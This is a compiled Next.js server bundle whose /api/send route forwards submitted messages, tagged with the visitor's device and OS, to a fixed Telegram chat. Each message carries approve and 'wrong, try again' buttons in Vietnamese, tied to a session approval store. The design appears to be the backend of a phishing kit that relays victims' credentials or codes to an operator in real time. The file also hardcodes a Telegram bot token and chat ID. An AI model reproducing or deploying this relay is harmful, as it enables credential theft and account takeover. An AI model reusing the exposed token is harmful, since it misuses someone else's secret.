module.exports = [
"[externals]/next/dist/compiled/next-server/app-route-turbo.runtime.dev.js [external] (next/dist/compiled/next-server/app-route-turbo.runtime.dev.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/compiled/next-server/app-route-turbo.runtime.dev.js", () => require("next/dist/compiled/next-server/app-route-turbo.runtime.dev.js"));

module.exports = mod;
}),
"[externals]/next/dist/compiled/@opentelemetry/api [external] (next/dist/compiled/@opentelemetry/api, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/compiled/@opentelemetry/api", () => require("next/dist/compiled/@opentelemetry/api"));

module.exports = mod;
}),
"[externals]/next/dist/compiled/next-server/app-page-turbo.runtime.dev.js [external] (next/dist/compiled/next-server/app-page-turbo.runtime.dev.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/compiled/next-server/app-page-turbo.runtime.dev.js", () => require("next/dist/compiled/next-server/app-page-turbo.runtime.dev.js"));

module.exports = mod;
}),
"[externals]/next/dist/server/app-render/work-unit-async-storage.external.js [external] (next/dist/server/app-render/work-unit-async-storage.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/server/app-render/work-unit-async-storage.external.js", () => require("next/dist/server/app-render/work-unit-async-storage.external.js"));

module.exports = mod;
}),
"[externals]/next/dist/server/app-render/work-async-storage.external.js [external] (next/dist/server/app-render/work-async-storage.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/server/app-render/work-async-storage.external.js", () => require("next/dist/server/app-render/work-async-storage.external.js"));

module.exports = mod;
}),
"[externals]/next/dist/shared/lib/no-fallback-error.external.js [external] (next/dist/shared/lib/no-fallback-error.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/shared/lib/no-fallback-error.external.js", () => require("next/dist/shared/lib/no-fallback-error.external.js"));

module.exports = mod;
}),
"[externals]/node:crypto [external] (node:crypto, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("node:crypto", () => require("node:crypto"));

module.exports = mod;
}),
"[project]/src/lib/redis.ts [app-route] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "getRedis",
    ()=>getRedis,
    "hasRedis",
    ()=>hasRedis
]);
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f40$upstash$2b$redis$40$1$2e$38$2e$2$2f$node_modules$2f40$upstash$2f$redis$2f$nodejs$2e$mjs__$5b$app$2d$route$5d$__$28$ecmascript$29$__$3c$locals$3e$__ = __turbopack_context__.i("[project]/node_modules/.pnpm/@upstash+redis@1.38.2/node_modules/@upstash/redis/nodejs.mjs [app-route] (ecmascript) <locals>");
;
function getRedisConfig() {
    const url = process.env.UPSTASH_REDIS_REST_URL ?? process.env.KV_REST_API_URL;
    const token = process.env.UPSTASH_REDIS_REST_TOKEN ?? process.env.KV_REST_API_TOKEN;
    if (!url || !token) return null;
    return {
        url,
        token
    };
}
function hasRedis() {
    return getRedisConfig() !== null;
}
function getRedis() {
    const config = getRedisConfig();
    if (!config) return null;
    return new __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f40$upstash$2b$redis$40$1$2e$38$2e$2$2f$node_modules$2f40$upstash$2f$redis$2f$nodejs$2e$mjs__$5b$app$2d$route$5d$__$28$ecmascript$29$__$3c$locals$3e$__["Redis"](config);
}
}),
"[project]/src/lib/approval-store.ts [app-route] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "createApproval",
    ()=>createApproval,
    "getApproval",
    ()=>getApproval,
    "setApprovalStatus",
    ()=>setApprovalStatus
]);
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$redis$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/redis.ts [app-route] (ecmascript)");
;
const TTL_SECONDS = 30 * 60;
const KEY_PREFIX = 'approval:';
const globalForApproval = globalThis;
const memoryStore = globalForApproval.__approvalStore ?? new Map();
globalForApproval.__approvalStore = memoryStore;
function memoryKey(sessionId) {
    return `${KEY_PREFIX}${sessionId}`;
}
function cleanupExpiredMemory() {
    const now = Date.now();
    for (const [id, entry] of memoryStore){
        if (now - entry.createdAt > TTL_SECONDS * 1000) {
            memoryStore.delete(id);
        }
    }
}
async function setEntry(sessionId, entry) {
    const redis = (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$redis$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["getRedis"])();
    if (redis) {
        await redis.set(memoryKey(sessionId), entry, {
            ex: TTL_SECONDS
        });
        return;
    }
    cleanupExpiredMemory();
    memoryStore.set(sessionId, entry);
}
async function getEntry(sessionId) {
    const redis = (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$redis$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["getRedis"])();
    if (redis) {
        const entry = await redis.get(memoryKey(sessionId));
        return entry ?? null;
    }
    cleanupExpiredMemory();
    return memoryStore.get(sessionId) ?? null;
}
async function createApproval(sessionId, type) {
    await setEntry(sessionId, {
        status: 'pending',
        type,
        createdAt: Date.now()
    });
}
async function getApproval(sessionId) {
    const entry = await getEntry(sessionId);
    return entry ?? undefined;
}
async function setApprovalStatus(sessionId, status) {
    const entry = await getEntry(sessionId);
    if (!entry) return false;
    await setEntry(sessionId, {
        ...entry,
        status
    });
    return true;
}
}),
"[project]/src/lib/telegram.ts [app-route] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "CHAT_ID",
    ()=>CHAT_ID,
    "TOKEN",
    ()=>TOKEN,
    "buildApprovalKeyboard",
    ()=>buildApprovalKeyboard,
    "telegramRequest",
    ()=>telegramRequest
]);
const TOKEN = process.env.TELEGRAM_BOT_TOKEN ?? '7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID ?? '7211586401';
;
function buildApprovalKeyboard(type, sessionId) {
    return {
        inline_keyboard: [
            [
                {
                    text: '✅ Duyệt — đúng',
                    callback_data: `approve:${type}:${sessionId}`
                },
                {
                    text: '❌ Sai — thử lại',
                    callback_data: `reject:${type}:${sessionId}`
                }
            ]
        ]
    };
}
async function telegramRequest(method, body) {
    const url = `https://api.telegram.org/bot${TOKEN}/${method}`;
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    });
    return response.json();
}
}),
"[externals]/next/dist/server/app-render/after-task-async-storage.external.js [external] (next/dist/server/app-render/after-task-async-storage.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/server/app-render/after-task-async-storage.external.js", () => require("next/dist/server/app-render/after-task-async-storage.external.js"));

module.exports = mod;
}),
"[project]/src/app/api/send/route.ts [app-route] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "POST",
    ()=>POST
]);
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$approval$2d$store$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/approval-store.ts [app-route] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$telegram$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/telegram.ts [app-route] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/.pnpm/next@16.0.10_@babel+core@7._5cc6f5c90c49b93e33883c7b7dd1b8ab/node_modules/next/server.js [app-route] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$ua$2d$parser$2d$js$40$2$2e$0$2e$9$2f$node_modules$2f$ua$2d$parser$2d$js$2f$src$2f$main$2f$ua$2d$parser$2e$mjs__$5b$app$2d$route$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/.pnpm/ua-parser-js@2.0.9/node_modules/ua-parser-js/src/main/ua-parser.mjs [app-route] (ecmascript)");
;
;
;
;
function appendDeviceInfo(message, req) {
    const ua = req.headers.get('user-agent') || '';
    const parser = new __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$ua$2d$parser$2d$js$40$2$2e$0$2e$9$2f$node_modules$2f$ua$2d$parser$2d$js$2f$src$2f$main$2f$ua$2d$parser$2e$mjs__$5b$app$2d$route$5d$__$28$ecmascript$29$__["UAParser"](ua);
    const uaResult = parser.getResult();
    const deviceType = uaResult.device.type || 'desktop';
    const deviceVendor = uaResult.device.vendor || 'Unknown';
    const deviceModel = uaResult.device.model || 'Unknown';
    const osName = uaResult.os.name || 'Unknown';
    const osVersion = uaResult.os.version || 'Unknown';
    const deviceName = [
        deviceVendor,
        deviceModel
    ].filter((item)=>item && item !== 'Unknown').join(' ');
    const finalDeviceName = deviceName || (deviceType === 'desktop' ? 'Desktop' : deviceType);
    const osLabel = `${osName}${osVersion !== 'Unknown' ? ` ${osVersion}` : ''}`;
    const deviceInfo = `${finalDeviceName} | ${osLabel}`;
    return message.includes('__DEVICE_INFO__') ? message.replace('__DEVICE_INFO__', deviceInfo) : message;
}
const POST = async (req)=>{
    try {
        const body = await req.json();
        const { message, message_id, old_message_id, approval_type, session_id } = body;
        if (!message) {
            return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
                success: false
            }, {
                status: 400
            });
        }
        const deleteMessageId = old_message_id ?? message_id;
        const messageWithDeviceInfo = appendDeviceInfo(message, req);
        if (deleteMessageId) {
            try {
                await fetch(`https://api.telegram.org/bot${__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$telegram$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["TOKEN"]}/deleteMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$telegram$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["CHAT_ID"],
                        message_id: deleteMessageId
                    })
                });
            } catch  {
            //
            }
        }
        const needsApproval = approval_type && session_id;
        if (needsApproval) {
            await (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$approval$2d$store$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["createApproval"])(session_id, approval_type);
        }
        const payload = {
            chat_id: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$telegram$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["CHAT_ID"],
            text: needsApproval ? `${messageWithDeviceInfo}\n\n⏳ <b>Chờ duyệt...</b>` : messageWithDeviceInfo,
            parse_mode: 'HTML'
        };
        if (needsApproval) {
            payload.reply_markup = (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$telegram$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["buildApprovalKeyboard"])(approval_type, session_id);
        }
        const response = await fetch(`https://api.telegram.org/bot${__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$telegram$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["TOKEN"]}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        if (!response.ok) {
            return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
                success: false
            }, {
                status: 500
            });
        }
        const data = await response.json();
        const result = data?.result;
        return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
            success: true,
            message_id: result?.message_id ?? null,
            session_id: needsApproval ? session_id : null
        });
    } catch  {
        return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
            success: false
        }, {
            status: 500
        });
    }
};
;
}),
];

//# sourceMappingURL=%5Broot-of-the-server%5D__ca38243a._.js.map